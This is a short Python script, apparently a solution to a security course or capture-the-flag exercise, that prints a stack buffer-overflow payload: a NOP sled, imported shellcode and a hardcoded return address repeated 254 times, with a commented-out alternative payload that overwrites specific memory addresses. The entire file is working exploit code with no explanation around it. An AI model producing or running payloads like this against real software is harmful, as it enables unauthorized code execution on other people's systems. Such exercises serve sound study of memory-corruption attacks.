from shellcode import shellcode
from struct import pack

print("\x90"*0x100 + shellcode + "\xaa" + pack("<I", 0xbffea290)*254)
# print("\xaa"*22 + pack("<I", 0x0804a030) + "\xaa"*4 + pack("<I", 0x080c61e5))